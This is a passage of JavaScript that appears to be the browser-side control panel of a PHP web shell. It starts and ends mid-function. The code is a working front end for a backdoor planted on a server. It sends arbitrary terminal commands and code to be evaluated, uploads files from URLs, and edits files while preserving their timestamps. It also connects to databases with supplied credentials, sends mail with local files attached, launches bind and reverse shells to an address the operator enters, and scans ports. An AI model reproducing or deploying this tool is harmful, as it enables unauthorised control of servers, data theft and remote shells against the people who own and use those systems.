  findfolder = "<table class='boxtbl'><thead><tr><th colspan='2'><p class='boxtitle'>Find Folder</p></th></tr></thead><tbody><tr><td style='width:144px'>Search in</td><td><input type='text' class='findFolderPath' value='" + path + "' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td style='border-bottom:none;'>Foldername contains</td><td style='border-bottom:none;'><input type='text' class='findFoldername' onkeydown=\"trap_enter(event, 'find_go_folder');\"></td></tr><tr><td></td><td><span class='cBox findFoldernameRegex'></span><span class='floatLeft'>Regex</span>&nbsp;&nbsp;&nbsp;<span class='cBox findFoldernameInsensitive'></span><span class='floatLeft'>Case Insensitive</span></td></tr><tr><td>Permissions</td><td><span class='cBox findReadable'></span><span class='floatLeft'>Readable</span>&nbsp;&nbsp;<span class='cBox findWritable'></span><span class='floatLeft'>Writable</span>&nbsp;&nbsp;<span class='cBox findExecutable'></span><span class='floatLeft'>Executable</span></td></tr></tbody><tfoot><tr><td><span class='button navbar' data-path='" + path + "'>explorer</span></td><td><span class='button' onclick=\"find_go_folder();\">find</span></td></tr><tr><td colspan='2' class='findResult'></td></tr></tfoot></table>";
  $('#explorer').html("<div id='xplUpload'>" + findfile + '<br>' + findfolder + '</div>');
  cbox_bind('xplUpload')
}

function find_go_file() {
  find_go('file')
}

function find_go_folder() {
  find_go('folder')
}

function find_go(findType) {
  findPath = (findType == 'file') ? $('.findfilePath').val() : $('.findFolderPath').val();
  findResult = (findType == 'file') ? $('.findfileResult') : $('.findResult');
  findName = (findType == 'file') ? $('.findfileFilename').val() : $('.findFoldername').val();
  findNameRegex = (findType == 'file') ? $('.findfileFilenameRegex').hasClass('cBoxSelected').toString() : $('.findFoldernameRegex').hasClass('cBoxSelected').toString();
  findNameInsensitive = (findType == 'file') ? $('.findfileFilenameInsensitive').hasClass('cBoxSelected').toString() : $('.findFoldernameInsensitive').hasClass('cBoxSelected').toString();
  findContent = (findType == 'file') ? $('.findfileContains').val() : "";
  findContentRegex = (findType == 'file') ? $('.findfileContainsRegex').hasClass('cBoxSelected').toString() : "";
  findContentInsensitive = (findType == 'file') ? $('.findfileContainsInsensitive').hasClass('cBoxSelected').toString() : "";
  findReadable = (findType == 'file') ? $('.findfileReadable').hasClass('cBoxSelected').toString() : $('.findWritable').hasClass('cBoxSelected').toString();
  findWritable = (findType == 'file') ? $('.findfileWritable').hasClass('cBoxSelected').toString() : $('.findReadable').hasClass('cBoxSelected').toString();
  findExecutable = (findType == 'file') ? $('.findfileExecutable').hasClass('cBoxSelected').toString() : $('.findExecutable').hasClass('cBoxSelected').toString();
  send_post({
    findType: findType,
    findPath: findPath,
    findName: findName,
    findNameRegex: findNameRegex,
    findNameInsensitive: findNameInsensitive,
    findContent: findContent,
    findContentRegex: findContentRegex,
    findContentInsensitive: findContentInsensitive,
    findReadable: findReadable,
    findWritable: findWritable,
    findExecutable: findExecutable
  }, function(res) {
    if (res != 'error') {
      findResult.html(res)
    }
  })
}

function ul_go_comp() {
  ul_go('comp')
}

function ul_go_url() {
  ul_go('url')
}

function ul(path) {
  ulcomputer = "<table class='boxtbl ulcomp'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Computer <a onclick='ul_add_comp();'>(+)</a></p></th></tr></thead><tbody class='ulcompadd'></tbody><tfoot><tr><td><span class='button navbar' data-path='" + path + "'>explorer</span></td><td><span class='button' onclick=\"ul_go_comp();\">upload</span></td></tr><tr><td colspan='2' class='ulCompResult'></td></tr><tr><td colspan='2'><div id='ulDragNDrop'>Or Drag and Drop files here</div></td></tr><tr><td colspan='2' class='ulDragNDropResult'></td></tr></tfoot></table>";
  ulurl = "<table class='boxtbl ulurl'><thead><tr><th colspan='2'><p class='boxtitle'>Upload From Url <a onclick='ul_add_url();'>(+)</a></p></th></tr></thead><tbody class='ulurladd'></tbody><tfoot><tr><td><span class='button navbar' data-path='" + path + "'>explorer</span></td><td><span class='button' onclick=\"ul_go_url();\">upload</span></td></tr><tr><td colspan='2' class='ulUrlResult'></td></tr></tfoot></table>";
  content = ulcomputer + '<br>' + ulurl + "<input type='hidden' class='ul_path' value='" + path + "'>";
  $('#explorer').html(content);
  ul_add_comp();
  ul_add_url();
  $('#ulDragNDrop').on('dragenter', function(e) {
    e.stopPropagation();
    e.preventDefault()
  });
  $('#ulDragNDrop').on('dragover', function(e) {
    e.stopPropagation();
    e.preventDefault()
  });
  $('#ulDragNDrop').on('drop', function(e) {
    e.stopPropagation();
    e.preventDefault();
    files = e.target.files || e.dataTransfer.files;
    ulResult = $('.ulDragNDropResult');
    ulResult.html('');
    $.each(files, function(i) {
      if (this) {
        ulType = 'DragNDrop';
        filename = this.name;
        var formData = new FormData();
        formData.append('ulFile', this);
        formData.append('ulSaveTo', get_cwd());
        formData.append('ulFilename', filename);
        formData.append('ulType', 'comp');
        entry = "<p class='ulRes" + ulType + i + "'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename" + ulType + i + "'>" + filename + "</a>&nbsp;<span class='ulProgress" + ulType + i + "'></span></p>";
        ulResult.append(entry);
        if (this.size <= 0) {
          $('.ulProgress' + ulType + i).html('( failed )');
          $('.ulProgress' + ulType + i).removeClass('ulProgress' + ulType + i);
          $('.ulFilename' + ulType + i).removeClass('ulFilename' + ulType + i)
        } else {
          ul_start(formData, ulType, i)
        }
      }
    })
  })
}

function ul_add_comp(path) {
  path = html_safe($('.ul_path').val());
  $('.ulcompadd').append("<tr><td style='width:144px'>File</td><td><input type='file' class='ulFileComp'></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToComp' value='" + path + "' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameComp' onkeydown=\"trap_enter(event, 'ul_go_comp');\"></td></tr>")
}

function ul_add_url(path) {
  path = html_safe($('.ul_path').val());
  $('.ulurladd').append("<tr><td style='width:144px'>File URL</td><td><input type='text' class='ulFileUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Save to</td><td><input type='text' class='ulSaveToUrl' value='" + path + "' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr><tr><td>Filename (Optional)</td><td><input type='text' class='ulFilenameUrl' onkeydown=\"trap_enter(event, 'ul_go_url');\"></td></tr>")
}

function ul_start(formData, ulType, i) {
  loading_start();
  $.ajax({
    url: targeturl,
    type: 'POST',
    data: formData,
    cache: false,
    contentType: false,
    processData: false,
    xhr: function() {
      myXhr = $.ajaxSettings.xhr();
      if (myXhr.upload) {
        myXhr.upload.addEventListener('progress', function(e) {
          percent = Math.floor(e.loaded / e.total * 100);
          $('.ulProgress' + ulType + i).html('( ' + percent + '% )')
        }, false)
      }
      return myXhr
    },
    success: function(res) {
      if (res.match(/Warning.*POST.*Content-Length.*of.*bytes.*exceeds.*the.*limit.*of/)) {
        res = 'error'
      }
      if (res == 'error') {
        $('.ulProgress' + ulType + i).html('( failed )')
      } else {
        $('.ulRes' + ulType + i).html(res)
      }
      loading_stop()
    },
    error: function() {
      loading_stop();
      $('.ulProgress' + ulType + i).html('( failed )');
      $('.ulProgress' + ulType + i).removeClass('ulProgress' + ulType + i);
      $('.ulFilename' + ulType + i).removeClass('ulFilename' + ulType + i)
    }
  })
}

function ul_go(ulType) {
  ulFile = (ulType == 'comp') ? $('.ulFileComp') : $('.ulFileUrl');
  ulResult = (ulType == 'comp') ? $('.ulCompResult') : $('.ulUrlResult');
  ulResult.html('');
  ulFile.each(function(i) {
    if (((ulType == 'comp') && this.files[0]) || ((ulType == 'url') && (this.value != ''))) {
      file = (ulType == 'comp') ? this.files[0] : this.value;
      filename = (ulType == 'comp') ? file.name : file.substring(file.lastIndexOf('/') + 1);
      ulSaveTo = (ulType == 'comp') ? $('.ulSaveToComp')[i].value : $('.ulSaveToUrl')[i].value;
      ulFilename = (ulType == 'comp') ? $('.ulFilenameComp')[i].value : $('.ulFilenameUrl')[i].value;
      var formData = new FormData();
      formData.append('ulFile', file);
      formData.append('ulSaveTo', ulSaveTo);
      formData.append('ulFilename', ulFilename);
      formData.append('ulType', ulType);
      entry = "<p class='ulRes" + ulType + i + "'><span class='strong'>&gt;</span>&nbsp;<a onclick='view_entry(this);' class='ulFilename" + ulType + i + "'>" + filename + "</a>&nbsp;<span class='ulProgress" + ulType + i + "'></span></p>";
      ulResult.append(entry);
      check = true;
      if (ulType == 'comp') {
        check = (file.size <= 0)
      } else check = (file == "");
      if (check) {
        $('.ulProgress' + ulType + i).html('( failed )');
        $('.ulProgress' + ulType + i).removeClass('ulProgress' + ulType + i);
        $('.ulFilename' + ulType + i).removeClass('ulFilename' + ulType + i)
      } else {
        ul_start(formData, ulType, i)
      }
    }
  })
}

function trap_ctrl_enter(el, e, callback) {
  if (e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)) {
    if (callback != null) window[callback]()
  }
  fix_tabchar(el, e)
}

function edit_save_raw() {
  edit_save('edit')
}

function edit_save_hex() {
  edit_save('hex')
}

function edit_save(editType) {
  editFilename = $('#editFilename').val();
  editInput = $('#editInput').val();
  editSuccess = false;
  preserveTimestamp = 'false';
  if ($('.cBox').hasClass('cBoxSelected')) preserveTimestamp = 'true';
  send_post({
    editType: editType,
    editFilename: editFilename,
    editInput: editInput,
    preserveTimestamp: preserveTimestamp
  }, function(res) {
    if (res != 'error') {
      editSuccess = 'success';
      view(editFilename, editType, preserveTimestamp)
    } else editSuccess = 'error'
  })
}

function mass_act(type) {
  buffer = get_all_cbox_selected('xplTable', 'xpl_href');
  if ((type == 'cut') || (type == 'copy')) {
    localStorage.setItem('bufferLength', buffer.length);
    localStorage.setItem('bufferAction', type);
    $.each(buffer, function(i, v) {
      localStorage.setItem('buffer_' + i, v)
    })
  } else if (type == 'paste') {
    bufferLength = localStorage.getItem('bufferLength');
    bufferAction = localStorage.getItem('bufferAction');
    if (bufferLength > 0) {
      massBuffer = '';
      for (var i = 0; i < bufferLength; i++) {
        if ((buff = localStorage.getItem('buffer_' + i))) {
          massBuffer += buff + '\n'
        }
      }
      massBuffer = $.trim(massBuffer);
      if (bufferAction == 'cut') title = 'move';
      else if (bufferAction == 'copy') title = 'copy';
      content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' disabled>" + massBuffer + "</textarea></td></tr><tr><td class='colFit'>" + title + " here</td><td><input type='text' value='" + html_safe(get_cwd()) + "' onkeydown=\"trap_enter(event, 'mass_act_go_paste');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('paste');\">" + title + "</span></td></tr></table>";
      show_box(ucfirst(title), content)
    }
  } else if ((type == 'extract (tar)') || (type == 'extract (tar.gz)') || (type == 'extract (zip)')) {
    if (type == 'extract (tar)') arcType = 'untar';
    else if (type == 'extract (tar.gz)') arcType = 'untargz';
    else if (type == 'extract (zip)') arcType = 'unzip';
    if (buffer.length > 0) {
      massBuffer = '';
      $.each(buffer, function(i, v) {
        massBuffer += v + '\n'
      });
      massBuffer = $.trim(massBuffer);
      title = type;
      content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>" + massBuffer + "</textarea></td></tr><tr><td class='colFit'>Extract to</td><td><input class='massValue' type='text' value='" + html_safe(get_cwd()) + "'onkeydown=\"trap_enter(event, 'mass_act_go_" + arcType + "');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('" + arcType + "');\">extract</span></td></tr></table>";
      show_box(ucfirst(title), content)
    }
  } else if ((type == 'compress (tar)') || (type == 'compress (tar.gz)') || (type == 'compress (zip)')) {
    date = new Date();
    rand = date.getTime();
    if (type == 'compress (tar)') {
      arcType = 'tar';
      arcFilename = rand + '.tar'
    } else if (type == 'compress (tar.gz)') {
      arcType = 'targz';
      arcFilename = rand + '.tar.gz'
    } else if (type == 'compress (zip)') {
      arcType = 'zip';
      arcFilename = rand + '.zip'
    }
    if (buffer.length > 0) {
      massBuffer = '';
      $.each(buffer, function(i, v) {
        massBuffer += v + '\n'
      });
      massBuffer = $.trim(massBuffer);
      title = type;
      content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>" + massBuffer + "</textarea></td></tr><tr><td class='colFit'>Archive</td><td><input class='massValue' type='text' value='" + arcFilename + "' onkeydown=\"trap_enter(event, 'mass_act_go_" + arcType + "');\"></td></tr><tr><td colspan='2'><span class='button' onclick=\"mass_act_go('" + arcType + "');\">compress</span></td></tr></table>";
      show_box(ucfirst(title), content)
    }
  } else if (type != '') {
    if (buffer.length > 0) {
      massBuffer = '';
      $.each(buffer, function(i, v) {
        massBuffer += v + '\n'
      });
      massBuffer = $.trim(massBuffer);
      title = type;
      line = '';
      if (type == 'chmod') line = "<tr><td class='colFit'>chmod</td><td><input class='massValue' type='text' value='0777' onkeydown=\"trap_enter(event, 'mass_act_go_" + type + "');\"></td></tr>";
      else if (type == 'chown') line = "<tr><td class='colFit'>chown</td><td><input class='massValue' type='text' value='root' onkeydown=\"trap_enter(event, 'mass_act_go_" + type + "');\"></td></tr>";
      else if (type == 'touch') {
        var now = new Date();
        line = "<tr><td class='colFit'>touch</td><td><input class='massValue' type='text' value='" + now.toGMTString() + "' onkeydown=\"trap_enter(event, 'mass_act_go_" + type + "');\"></td></tr>"
      }
      content = "<table class='boxtbl'><tr><td colspan='2'><textarea class='massBuffer' style='height:120px;min-height:120px;' wrap='off' disabled>" + massBuffer + "</textarea></td></tr>" + line + "<tr><td colspan='2'><span class='button' onclick=\"mass_act_go('" + type + "');\">" + title + "</span></td></tr></table>";
      show_box(ucfirst(title), content)
    }
  }
  $('.cBoxSelected').removeClass('cBoxSelected');
  xpl_update_status()
}

function mass_act_go_tar() {
  mass_act_go('tar')
}

function mass_act_go_targz() {
  mass_act_go('targz')
}

function mass_act_go_zip() {
  mass_act_go('zip')
}

function mass_act_go_untar() {
  mass_act_go('untar')
}

function mass_act_go_untargz() {
  mass_act_go('untargz')
}

function mass_act_go_unzip() {
  mass_act_go('unzip')
}

function mass_act_go_paste() {
  mass_act_go('paste')
}

function mass_act_go_chmod() {
  mass_act_go('chmod')
}

function mass_act_go_chown() {
  mass_act_go('chown')
}

function mass_act_go_touch() {
  mass_act_go('touch')
}

function mass_act_go(massType) {
  massBuffer = $.trim($('.massBuffer').val());
  massPath = get_cwd();
  massValue = '';
  if (massType == 'paste') {
    bufferLength = localStorage.getItem('bufferLength');
    bufferAction = localStorage.getItem('bufferAction');
    if (bufferLength > 0) {
      massBuffer = '';
      for (var i = 0; i < bufferLength; i++) {
        if ((buff = localStorage.getItem('buffer_' + i))) {
          massBuffer += buff + '\n'
        }
      }
      massBuffer = $.trim(massBuffer);
      if (bufferAction == 'copy') massType = 'copy';
      else if (bufferAction == 'cut') massType = 'cut'
    }
  } else if ((massType == 'chmod') || (massType == 'chown') || (massType == 'touch')) {
    massValue = $('.massValue').val()
  } else if ((massType == 'tar') || (massType == 'targz') || (massType == 'zip')) {
    massValue = $('.massValue').val()
  } else if ((massType == 'untar') || (massType == 'untargz') || (massType == 'unzip')) {
    massValue = $('.massValue').val()
  }
  if (massBuffer != '') {
    send_post({
      massType: massType,
      massBuffer: massBuffer,
      massPath: massPath,
      massValue: massValue
    }, function(res) {
      if (res != 'error') {
        $('.boxresult').html(res + ' Operation(s) succeeded')
      } else $('.boxresult').html('Operation(s) failed');
      navigate(get_cwd())
    })
  }
}

function xpl_update_status() {
  totalSelected = $('#xplTable').find('.cBoxSelected').not('.cBoxAll').length;
  if (totalSelected == 0) $('.xplSelected').html('');
  else $('.xplSelected').html(', ' + totalSelected + ' item(s) selected')
}

function xpl_bind() {
  $('.navigate').off('click');
  $('.navigate').on('click', function(e) {
    path = xpl_href($(this));
    navigate(path);
    hide_box()
  });
  $('.navbar').off('click');
  $('.navbar').on('click', function(e) {
    path = $(this).attr('data-path');
    navigate(path);
    hide_box()
  });
  $('.newfolder').off('click');
  $('.newfolder').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    newfolder(path)
  });
  $('.newfile').off('click');
  $('.newfile').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    newfile(path)
  });
  $('.del').off('click');
  $('.del').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    del(path)
  });
  $('.view').off('click');
  $('.view').on('click', function(e) {
    path = xpl_href($(this));
    view(path, 'auto');
    hide_box()
  });
  $('.hex').off('click');
  $('.hex').on('click', function(e) {
    path = xpl_href($(this));
    view(path, 'hex')
  });
  $('#viewFullsize').off('click');
  $('#viewFullsize').on('click', function(e) {
    src = $('#viewImage').attr('src');
    window.open(src)
  });
  $('.edit').off('click');
  $('.edit').on('click', function(e) {
    path = xpl_href($(this));
    view(path, 'edit');
    hide_box()
  });
  $('.ren').off('click');
  $('.ren').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    ren(path)
  });
  $('.action').off('click');
  $('.action').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    action(path, 'file')
  });
  $('.actionfolder').off('click');
  $('.actionfolder').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    action(path, 'dir')
  });
  $('.actiondot').off('click');
  $('.actiondot').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    action(path, 'dot')
  });
  $('.dl').off('click');
  $('.dl').on('click', function(e) {
    path = html_safe(xpl_href($(this)));
    $('#form').append("<input type='hidden' name='download' value='" + path + "'>");
    $('#form').submit();
    $('#form').html('');
    hide_box()
  });
  $('.ul').off('click');
  $('.ul').on('click', function(e) {
    path = xpl_href($(this));
    navigate(path, false);
    path = html_safe(path);
    ul(path);
    hide_box()
  });
  $('.find').off('click');
  $('.find').on('click', function(e) {
    path = xpl_href($(this));
    navigate(path, false);
    path = html_safe(path);
    find(path);
    hide_box()
  });
  $('#massAction').off('click');
  $('#massAction').on('change', function(e) {
    type = $('#massAction').val();
    mass_act(type);
    $('#massAction').val('Action')
  });
  cbox_bind('xplTable', 'xpl_update_status')
}

function xpl_href(el) {
  return el.parent().parent().attr('data-path')
}

function multimedia(path) {
  var a = $('video').get(0);
  send_post({
    multimedia: path
  }, function(res) {
    a.src = res
  });
  hide_box()
}
$('#terminalInput').on('keydown', function(e) {
  if (e.keyCode == 13) {
    cmd = $('#terminalInput').val();
    terminalHistory.push(cmd);
    terminalHistoryPos = terminalHistory.length;
    if (cmd == 'clear' || cmd == 'cls') {
      $('#terminalOutput').html('')
    } else if ((path = cmd.match(/cd(.*)/i)) || (path = cmd.match(/^([a-z]:)$/i))) {
      path = $.trim(path[1]);
      navigate(path)
    } else if (cmd != '') {
      send_post({
        terminalInput: cmd
      }, function(res) {
        cwd = html_safe(get_cwd());
        res = '<span class=\'strong\'>' + cwd + '&gt;</span>' + html_safe(cmd) + '\n' + res + '\n';
        $('#terminalOutput').append(res);
        bottom = $(document).height() - $(window).height();
        $(window).scrollTop(bottom)
      })
    }
    $('#terminalInput').val('');
    setTimeout("$('#terminalInput').focus()", 100)
  } else if (e.keyCode == 38) {
    if (terminalHistoryPos > 0) {
      terminalHistoryPos--;
      $('#terminalInput').val(terminalHistory[terminalHistoryPos]);
      if (terminalHistoryPos < 0) terminalHistoryPos = 0
    }
  } else if (e.keyCode == 40) {
    if (terminalHistoryPos < terminalHistory.length - 1) {
      terminalHistoryPos++;
      $('#terminalInput').val(terminalHistory[terminalHistoryPos]);
      if (terminalHistoryPos > terminalHistory.length) terminalHistoryPos = terminalHistory.length
    }
  }
  fix_tabchar(this, e)
});

function eval_go() {
  evalType = $('#evalType').val();
  evalInput = $('#evalInput').val();
  evalOptions = $('#evalOptions').val();
  evalArguments = $('#evalArguments').val();
  if (evalOptions == 'Options/Switches') evalOptions = '';
  if (evalArguments == 'Arguments') evalArguments = '';
  if ($.trim(evalInput) != '') {
    send_post({
      evalInput: evalInput,
      evalType: evalType,
      evalOptions: evalOptions,
      evalArguments: evalArguments
    }, function(res) {
      if (res != 'error') {
        splits = res.split('{[|kb13|]}');
        if (splits.length == 2) {
          output = splits[0] + "<hr>" + splits[1];
          $('#evalOutput').html(output)
        } else {
          $('#evalOutput').html(res)
        }
      }
    })
  }
}

function eval_init() {
  if ((evalSupported = localStorage.getItem('evalSupported'))) {
    eval_bind();
    output("eval : " + evalSupported);
    evalReady = true
  } else {
    send_post({
      evalGetSupported: "evalGetSupported"
    }, function(res) {
      evalReady = true;
      if (res != "error") {
        localStorage.setItem('evalSupported', res);
        evalSupported = res;
        eval_bind();
        output("eval : " + evalSupported)
      }
    })
  }
}

function eval_bind() {
  if ((evalSupported != null) && (evalSupported != '')) {
    splits = evalSupported.split(",");
    $.each(splits, function(i, k) {
      $('#evalType').append("<option>" + k + "</option>")
    })
  }
  $('#evalType').on('change', function(e) {
    if ($('#evalType').val() == 'php') {
      $('#evalAdditional').hide()
    } else {
      $('#evalAdditional').show()
    }
  });
  $('#evalOptions').on('focus', function(e) {
    options = $('#evalOptions');
    if (options.val() == 'Options/Switches') options.val('')
  });
  $('#evalOptions').on('blur', function(e) {
    options = $('#evalOptions');
    if ($.trim(options.val()) == '') options.val('Options/Switches')
  });
  $('#evalArguments').on('focus', function(e) {
    args = $('#evalArguments');
    if (args.val() == 'Arguments') args.val('')
  });
  $('#evalArguments').on('blur', function(e) {
    args = $('#evalArguments');
    if ($.trim(args.val()) == '') args.val('Arguments')
  });
  $('#evalInput').on('keydown', function(e) {
    if (e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)) {
      eval_go()
    }
    fix_tabchar(this, e)
  })
}
Zepto(function($) {
  $('#decodeStr').on('keydown', function(e) {
    if (e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)) {
      decode_go()
    }
    fix_tabchar(this, e)
  })
});

function decode_go() {
  decodeStr = $('#decodeStr').val();
  send_post({
    decodeStr: decodeStr
  }, function(res) {
    if (res != 'error') {
      $('#decodeResult').html('');
      $('#decodeResult').html(res)
    }
  })
}
Zepto(function($) {
  db_init()
});
var dbSupported = "";
var dbPageLimit = 50;

function db_init() {
  if ((dbSupported = localStorage.getItem('db_supported'))) {
    db_bind();
    output("db : " + dbSupported);
    db_add_supported()
  } else {
    send_post({
      dbGetSupported: ""
    }, function(res) {
      if (res != "error") {
        localStorage.setItem('dbSupported', res);
        dbSupported = res;
        db_bind();
        output("db : " + dbSupported);
        db_add_supported()
      }
    })
  }
}

function db_add_supported() {
  splits = dbSupported.split(",");
  $.each(splits, function(i, k) {
    $('#dbType').append("<option>" + k + "</option>")
  })
}

function db_bind() {
  $('#dbType').on('change', function(e) {
    type = $('#dbType').val();
    if ((type == 'odbc') || (type == 'pdo')) {
      $('.dbHostLbl').html('DSN / Connection String');
      $('.dbUserRow').show();
      $('.dbPassRow').show();
      $('.dbPortRow').hide()
    } else if ((type == 'sqlite') || (type == 'sqlite3')) {
      $('.dbHostLbl').html('DB File');
      $('.dbUserRow').hide();
      $('.dbPassRow').hide();
      $('.dbPortRow').hide()
    } else {
      $('.dbHostLbl').html('Host');
      $('.dbUserRow').show();
      $('.dbPassRow').show();
      $('.dbPortRow').show()
    }
  });
  $('#dbQuery').on('focus', function(e) {
    if ($('#dbQuery').val() == 'You can also press ctrl+enter to submit') {
      $('#dbQuery').val('')
    }
  });
  $('#dbQuery').on('blur', function(e) {
    if ($('#dbQuery').val() == '') {
      $('#dbQuery').val('You can also press ctrl+enter to submit')
    }
  });
  $('#dbQuery').on('keydown', function(e) {
    if (e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)) {
      db_run()
    }
  })
}

function db_nav_bind() {
  dbType = $('#dbType').val();
  $('.boxNav').off('click');
  $('.boxNav').on('click', function() {
    $(this).next().toggle()
  });
  $('.dbTable').off('click');
  $('.dbTable').on('click', function() {
    type = $('#dbType').val();
    table = $(this).html();
    db = $(this).parent().parent().parent().prev().html();
    db_query_tbl(type, db, table, 0, dbPageLimit)
  })
}

function db_connect() {
  dbType = $('#dbType').val();
  dbHost = $('#dbHost').val();
  dbUser = $('#dbUser').val();
  dbPass = $('#dbPass').val();
  dbPort = $('#dbPort').val();
  send_post({
    dbType: dbType,
    dbHost: dbHost,
    dbUser: dbUser,
    dbPass: dbPass,
    dbPort: dbPort
  }, function(res) {
    if (res != 'error') {
      $('#dbNav').html(res);
      $('.dbHostRow').hide();
      $('.dbUserRow').hide();
      $('.dbPassRow').hide();
      $('.dbPortRow').hide();
      $('.dbConnectRow').hide();
      $('.dbQueryRow').show();
      $('#dbBottom').show();
      db_nav_bind()
    } else $('.dbError').html('Unable to connect')
  })
}

function db_disconnect() {
  $('.dbHostRow').show();
  $('.dbUserRow').show();
  $('.dbPassRow').show();
  $('.dbPortRow').show();
  $('.dbConnectRow').show();
  $('.dbQueryRow').hide();
  $('#dbNav').html('');
  $('#dbResult').html('');
  $('#dbBottom').hide()
}

function db_run() {
  dbType = $('#dbType').val();
  dbHost = $('#dbHost').val();
  dbUser = $('#dbUser').val();
  dbPass = $('#dbPass').val();
  dbPort = $('#dbPort').val();
  dbQuery = $('#dbQuery').val();
  if ((dbQuery != '') && (dbQuery != 'You can also press ctrl+enter to submit')) {
    send_post({
      dbType: dbType,
      dbHost: dbHost,
      dbUser: dbUser,
      dbPass: dbPass,
      dbPort: dbPort,
      dbQuery: dbQuery
    }, function(res) {
      if (res != 'error') {
        $('#dbResult').html(res);
        $('.tblResult').each(function() {
          sorttable.k(this)
        })
      }
    })
  }
}

function db_query_tbl(type, db, table, start, limit) {
  dbType = $('#dbType').val();
  dbHost = $('#dbHost').val();
  dbUser = $('#dbUser').val();
  dbPass = $('#dbPass').val();
  dbPort = $('#dbPort').val();
  send_post({
    dbType: dbType,
    dbHost: dbHost,
    dbUser: dbUser,
    dbPass: dbPass,
    dbPort: dbPort,
    dbQuery: '',
    dbDB: db,
    dbTable: table,
    dbStart: start,
    dbLimit: limit
  }, function(res) {
    if (res != 'error') {
      $('#dbResult').html(res);
      $('.tblResult').each(function() {
        sorttable.k(this)
      })
    }
  })
}

function db_pagination(type) {
  db = $('#dbDB').val();
  table = $('#dbTable').val();
  start = parseInt($('#dbStart').val());
  limit = parseInt($('#dbLimit').val());
  dbType = $('#dbType').val();
  if (type == 'next') {
    start = start + limit
  } else if (type == 'prev') {
    start = start - limit;
    if (start < 0) start = 0
  }
  db_query_tbl(dbType, db, table, start, limit)
}
Zepto(function($) {
  info_init()
});

function info_init() {
  if ((infoResult = localStorage.getItem('infoResult'))) {
    $('.infoResult').html(infoResult)
  } else {
    info_refresh()
  }
}

function info_toggle(id) {
  $('#' + id).toggle()
}

function info_refresh() {
  send_post({
    infoRefresh: 'infoRefresh'
  }, function(res) {
    $('.infoResult').html(res);
    localStorage.setItem('infoResult', res)
  })
}
Zepto(function($) {});

function mail_send() {
  mailFrom = $.trim($('#mailFrom').val());
  mailTo = $.trim($('#mailTo').val());
  mailSubject = $.trim($('#mailSubject').val());
  mailContent = $('#mailContent').val();
  mailAttachment = '';
  if ($('.mailAttachment')) {
    mailAttachment = $('.mailAttachment').map(function() {
      return this.value
    }).get().join('{[|kb13|]}')
  }
  send_post({
    mailFrom: mailFrom,
    mailTo: mailTo,
    mailSubject: mailSubject,
    mailContent: mailContent,
    mailAttachment: mailAttachment
  }, function(res) {
    $('#mailResult').html(res)
  })
}

function mail_attach() {
  content = "<tr><td>Local file <a onclick=\"$(this).parent().parent().remove();\">(-)</a></td><td colspan='2'><input type='text' class='mailAttachment' value=''></td></tr>";
  $('#mailTBody').append(content)
}
Zepto(function($) {
  rs_init()
});

function rs_init() {
  if (evalReady && (evalSupported != null) && (evalSupported != '')) {
    splits = evalSupported.split(",");
    $.each(splits, function(i, k) {
      $('.rsType').append("<option>" + k + "</option>")
    })
  } else setTimeout('rs_init()', 1000);
  $('#packetContent').on('keydown', function(e) {
    if (e.ctrlKey && (e.keyCode == 10 || e.keyCode == 13)) {
      packet_go()
    }
    fix_tabchar(this, e)
  })
}

function rs_go_bind() {
  rs_go('bind')
}

function rs_go_back() {
  rs_go('back')
}

function rs_go(rsType) {
  rsArgs = "";
  if (rsType == 'bind') {
    rsPort = parseInt($('#bindPort').val());
    rsLang = $('#bindLang').val();
    rsArgs = rsPort;
    rsResult = $('#bindResult')
  } else if (rsType == 'back') {
    rsAddr = $('#backAddr').val();
    rsPort = parseInt($('#backPort').val());
    rsLang = $('#backLang').val();
    rsArgs = rsPort + ' ' + rsAddr;
    rsResult = $('#backResult')
  }
  if ((isNaN(rsPort)) || (rsPort <= 0) || (rsPort > 65535)) {
    rsResult.html('Invalid port');
    return
  }
  if (rsArgs != '') {
    send_post({
      rsLang: rsLang,
      rsArgs: rsArgs
    }, function(res) {
      if (res != 'error') {
        splits = res.split('{[|kb13|]}');
        if (splits.length == 2) {
          output = splits[0] + "<hr>" + splits[1];
          rsResult.html(output)
        } else {
          rsResult.html(res)
        }
      }
    })
  }
}

function packet_go() {
  packetHost = $('#packetHost').val();
  packetStartPort = parseInt($('#packetStartPort').val());
  packetEndPort = parseInt($('#packetEndPort').val());
  packetTimeout = parseInt($('#packetTimeout').val());
  packetSTimeout = parseInt($('#packetSTimeout').val());
  packetContent = $('#packetContent').val();
  packetResult = $('#packetResult');
  packetStatus = $('#packetStatus');
  if ((isNaN(packetStartPort)) || (packetStartPort <= 0) || (packetStartPort > 65535)) {
    packetResult.html('Invalid start port');
    return
  }
  if ((isNaN(packetEndPort)) || (packetEndPort <= 0) || (packetEndPort > 65535)) {
    packetResult.html('Invalid end port');
    return
  }
  if ((isNaN(packetTimeout)) || (packetTimeout <= 0)) {
    packetResult.html('Invalid connection timeout');
    return
  }
  if ((isNaN(packetSTimeout)) || (packetSTimeout <= 0)) {
    packetResult.html('Invalid stream timeout');
    return
  }
